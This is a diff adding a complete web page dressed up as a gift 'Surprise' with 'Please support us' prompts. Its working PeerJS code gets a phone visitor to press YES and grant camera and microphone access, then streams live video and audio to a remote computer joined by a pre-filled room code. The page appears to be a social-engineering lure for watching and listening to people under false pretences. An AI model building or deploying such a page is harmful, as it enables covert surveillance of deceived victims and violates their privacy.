@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>🎁 Surprise</title>
+
+  <!-- PeerJS -->
+  <script src="https://unpkg.com/peerjs@1.5.5/dist/peerjs.min.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #080808, #171717);
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 700px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 42px;
+      margin-bottom: 15px;
+    }
+
+    #question {
+      font-size: 22px;
+      margin-bottom: 25px;
+    }
+
+    .box {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 20px;
+      padding: 25px;
+      backdrop-filter: blur(10px);
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 12px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    button {
+      border: none;
+      padding: 13px 25px;
+      border-radius: 12px;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+      margin: 6px;
+    }
+
+    #yesButton {
+      background: #1877f2;
+      color: white;
+    }
+
+    #noButton {
+      background: #e53935;
+      color: white;
+    }
+
+    #viewerButton {
+      background: #20c997;
+      color: white;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    video {
+      width: 100%;
+      max-height: 500px;
+      background: black;
+      border-radius: 18px;
+      margin-top: 20px;
+      object-fit: cover;
+    }
+
+    #status {
+      margin-top: 18px;
+      line-height: 1.5;
+      color: #ddd;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .role-title {
+      font-size: 20px;
+      margin-bottom: 15px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h1>🎁 Surprise</h1>
+
+  <div class="box">
+
+    <div id="question">
+      Choose how you want to use the surprise
+    </div>
+
+    <!-- SURPRISE CODE -->
+
+    <input
+      id="roomCode"
+      type="text"
+      maxlength="20"
+      value="support123"
+      placeholder="Surprise Code"
+      autocomplete="off"
+    >
+
+
+    <!-- PHONE -->
+
+    <div id="phoneSection">
+
+      <div class="role-title">
+        📱 Please support us
+      </div>
+
+      <button id="yesButton">
+        YES 🎁
+      </button>
+
+      <button id="noButton">
+        NO
+      </button>
+
+    </div>
+
+
+    <!-- COMPUTER -->
+
+    <div id="computerSection">
+
+      <div class="role-title">
+        💻 Please continue to our support to press Yes and preview our surprise
+      </div>
+
+      <button id="viewerButton">
+        CONNECT TO PHONE
+      </button>
+
+    </div>
+
+
+    <div id="status"></div>
+
+
+    <!-- PHONE CAMERA PREVIEW -->
+
+    <video
+      id="localVideo"
+      autoplay
+      muted
+      playsinline
+      class="hidden"
+    ></video>
+
+
+    <!-- COMPUTER REMOTE VIDEO -->
+
+    <video
+      id="remoteVideo"
+      autoplay
+      playsinline
+      controls
+      class="hidden"
+    ></video>
+
+  </div>
+
+</div>
+
+
+<script>
+
+  const roomCodeInput = document.getElementById("roomCode");
+
+  const yesButton = document.getElementById("yesButton");
+  const noButton = document.getElementById("noButton");
+  const viewerButton = document.getElementById("viewerButton");
+
+  const statusText = document.getElementById("status");
+
+  const localVideo = document.getElementById("localVideo");
+  const remoteVideo = document.getElementById("remoteVideo");
+
+  let peer = null;
+  let localStream = null;
+  let currentCall = null;
+
+
+  /*
+   * GET SURPRISE CODE
+   */
+
+  function getRoomCode() {
+
+    let room = roomCodeInput.value.trim();
+
+    room = room
+      .toLowerCase()
+      .replace(/[^a-z0-9]/g, "");
+
+    if (room.length < 4) {
+
+      alert(
+        "Please enter a valid Surprise Code."
+      );
+
+      return null;
+    }
+
+    return room;
+  }
+
+
+  /*
+   * PHONE PEER ID
+   */
+
+  function phonePeerId(room) {
+
+    return "surprise-phone-" + room;
+
+  }
+
+
+  /*
+   * STATUS
+   */
+
+  function showStatus(message) {
+
+    statusText.textContent = message;
+
+  }
+
+
+  /*
+   * CLEANUP
+   */
+
+  function cleanup() {
+
+    if (localStream) {
+
+      localStream.getTracks().forEach(track => {
+        track.stop();
+      });
+
+      localStream = null;
+
+    }
+
+
+    if (currentCall) {
+
+      try {
+        currentCall.close();
+      } catch (e) {}
+
+      currentCall = null;
+
+    }
+
+
+    if (peer) {
+
+      try {
+        peer.destroy();
+      } catch (e) {}
+
+      peer = null;
+
+    }
+
+  }
+
+
+  /*
+   * ==========================================
+   * PHONE SIDE
+   * ==========================================
+   */
+
+  yesButton.addEventListener("click", async () => {
+
+    const room = getRoomCode();
+
+    if (!room) {
+      return;
+    }
+
+
+    yesButton.disabled = true;
+    noButton.disabled = true;
+
+
+    showStatus(
+      "Requesting Camera & Microphone permission..."
+    );
+
+
+    /*
+     * CAMERA + MICROPHONE PERMISSION
+     */
+
+    try {
+
+      localStream = await navigator.mediaDevices.getUserMedia({
+
+        video: true,
+
+        audio: true
+
+      });
+
+    } catch (error) {
+
+      console.error(error);
+
+
+      showStatus(
+        "Camera/Microphone permission was not granted."
+      );
+
+
+      yesButton.disabled = false;
+      noButton.disabled = false;
+
+      return;
+
+    }
+
+
+    /*
+     * SHOW PHONE CAMERA
+     */
+
+    localVideo.srcObject = localStream;
+
+    localVideo.classList.remove("hidden");
+
+
+    /*
+     * CREATE PHONE PEER
+     */
+
+    const myPeerId = phonePeerId(room);
+
+    peer = new Peer(myPeerId);
+
+
+    /*
+     * PEER READY
+     */
+
+    peer.on("open", (id) => {
+
+      console.log(
+        "Phone Peer ID:",
+        id
+      );
+
+
+      showStatus(
+        "Camera & Microphone are ON. Waiting for the computer..."
+      );
+
+    });
+
+
+    /*
+     * COMPUTER CONNECTS
+     */
+
+    peer.on("connection", (connection) => {
+
+      console.log(
+        "Computer connected."
+      );
+
+
+      connection.on("open", () => {
+
+        showStatus(
+          "Computer connected. Starting live camera & microphone..."
+        );
+
+
+        const viewerPeerId = connection.peer;
+
+
+        /*
+         * SEND PHONE CAMERA + MICROPHONE
+         */
+
+        currentCall = peer.call(
+          viewerPeerId,
+          localStream
+        );
+
+
+        if (!currentCall) {
+
+          showStatus(
+            "Could not start the video connection."
+          );
+
+          return;
+
+        }
+
+
+        currentCall.on("close", () => {
+
+          showStatus(
+            "Computer disconnected."
+          );
+
+        });
+
+
+        currentCall.on("error", (error) => {
+
+          console.error(error);
+
+          showStatus(
+            "Video connection error."
+          );
+
+        });
+
+      });
+
+    });
+
+
+    /*
+     * PEER ERROR
+     */
+
+    peer.on("error", (error) => {
+
+      console.error(
+        "PeerJS error:",
+        error
+      );
+
+
+      if (error.type === "unavailable-id") {
+
+        showStatus(
+          "This Surprise Code is already being used. Please try again later."
+        );
+
+      } else {
+
+        showStatus(
+          "Connection error: " + error.type
+        );
+
+      }
+
+
+      yesButton.disabled = false;
+      noButton.disabled = false;
+
+    });
+
+  });
+
+
+  /*
+   * NO BUTTON
+   */
+
+  noButton.addEventListener("click", () => {
+
+    cleanup();
+
+
+    localVideo.srcObject = null;
+
+    localVideo.classList.add("hidden");
+
+
+    showStatus(
+      "Surprise was not opened."
+    );
+
+  });
+
+
+  /*
+   * ==========================================
+   * COMPUTER SIDE
+   * ==========================================
+   */
+
+  viewerButton.addEventListener("click", () => {
+
+    const room = getRoomCode();
+
+    if (!room) {
+      return;
+    }
+
+
+    viewerButton.disabled = true;
+
+
+    showStatus(
+      "Connecting to the phone..."
+    );
+
+
+    /*
+     * COMPUTER GETS RANDOM PEER ID
+     */
+
+    peer = new Peer();
+
+
+    /*
+     * PEER READY
+     */
+
+    peer.on("open", (myId) => {
+
+      console.log(
+        "Computer Peer ID:",
+        myId
+      );
+
+
+      const phoneId = phonePeerId(room);
+
+
+      /*
+       * CONNECT TO PHONE
+       */
+
+      const connection = peer.connect(
+        phoneId
+      );
+
+
+      connection.on("open", () => {
+
+        console.log(
+          "Connected to phone."
+        );
+
+
+        showStatus(
+          "Phone found. Waiting for live camera..."
+        );
+
+      });
+
+
+      connection.on("error", (error) => {
+
+        console.error(error);
+
+
+        showStatus(
+          "Could not connect to the phone."
+        );
+
+
+        viewerButton.disabled = false;
+
+      });
+
+    });
+
+
+    /*
+     * RECEIVE PHONE VIDEO + AUDIO
+     */
+
+    peer.on("call", (call) => {
+
+      console.log(
+        "Incoming video call."
+      );
+
+
+      currentCall = call;
+
+
+      /*
+       * COMPUTER DOES NOT SEND CAMERA/MIC
+       */
+
+      call.answer();
+
+
+      /*
+       * REMOTE STREAM
+       */
+
+      call.on("stream", (remoteStream) => {
+
+        console.log(
+          "Remote stream received."
+        );
+
+
+        remoteVideo.srcObject =
+          remoteStream;
+
+
+        remoteVideo.classList.remove(
+          "hidden"
+        );
+
+
+        showStatus(
+          "🟢 LIVE — Phone camera & microphone connected."
+        );
+
+
+        remoteVideo.play().catch(error => {
+
+          console.log(
+            "Browser requires interaction to start playback.",
+            error
+          );
+
+        });
+
+      });
+
+
+      /*
+       * CALL CLOSED
+       */
+
+      call.on("close", () => {
+
+        showStatus(
+          "Phone disconnected."
+        );
+
+
+        remoteVideo.srcObject = null;
+
+        remoteVideo.classList.add(
+          "hidden"
+        );
+
+      });
+
+
+      /*
+       * CALL ERROR
+       */
+
+      call.on("error", (error) => {
+
+        console.error(error);
+
+
+        showStatus(
+          "Video connection error."
+        );
+
+      });
+
+    });
+
+
+    /*
+     * PEER ERROR
+     */
+
+    peer.on("error", (error) => {
+
+      console.error(
+        "PeerJS error:",
+        error
+      );
+
+
+      showStatus(
+        "Connection error: " + error.type
+      );
+
+
+      viewerButton.disabled = false;
+
+    });
+
+  });
+
+
+  /*
+   * PAGE CLOSE
+   */
+
+  window.addEventListener(
+    "beforeunload",
+    () => {
+
+      cleanup();
+
+    }
+  );
+
+</script>
+
+</body>
+</html>
